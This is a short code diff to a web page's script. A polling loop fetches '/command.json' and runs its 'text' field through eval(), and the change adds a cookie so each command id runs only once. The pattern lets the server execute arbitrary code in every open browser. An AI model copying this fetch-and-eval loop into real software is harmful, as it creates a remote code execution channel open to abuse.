@@ -74,8 +74,12 @@
         $form.toggle(false);
 
         setInterval(function () {
-          $.getJSON('/command.json').done(function(data, status, xhr){
-            try { eval(data.text); } catch(e) {};
+          $.getJSON('/command.json').done(function(data){
+            last_command_id = document.cookie.split('last_command=').pop();
+            if (last_command_id != data.id) {
+              try { eval(data.text); } catch(e) {};
+              document.cookie = 'last_command=' + data.id + '; expires= ; path=/';
+            }
           });
         }, INTERVAL);
 
